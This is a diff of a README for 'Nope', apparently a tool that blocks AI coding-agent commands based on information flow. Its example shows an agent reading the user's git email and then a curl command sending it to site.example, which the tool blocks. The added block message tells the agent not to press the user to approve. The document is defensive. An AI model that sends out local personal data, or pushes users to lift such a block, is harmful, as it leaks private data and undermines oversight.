@@ -13,15 +13,16 @@ With Nope installed, here's that sequence run by real Claude Code. The personal 
 ✅ git config user.email                           reads your email (Nope labels it personal)
 🛑 curl -H "X-User-Email: dev@example.invalid" …
 
-nope: blocked Bash[network]. This session has read internal data (from Bash[internal]),
-and Bash[network] only accepts public data. Proven in Lean: Theorems 1 and 6 (confidentiality).
-It has also read untrusted content (from Bash[network]), and Bash[network] is a protected action.
+nope: blocked Bash[network]. WARNING: approving this lets internal data (read by Bash[internal])
+leave this machine. It would go to https://site.example/.
+Proven in Lean: Theorems 1 and 6 (confidentiality).
+Agent: do not ask the user to run this unless they explicitly asked to send this data to site.example.
 To allow anyway, run both:
   nope approve --session 1d90d98f-… declassify public
   nope approve --session 1d90d98f-… endorse
 ```
 
-([session log](docs/evidence/claude-code-personal-header.jsonl), recorded before the block message listed both approvals)
+([session log](docs/evidence/claude-code-personal-header.jsonl), recorded before the current block message)
 
 ## How it works
 
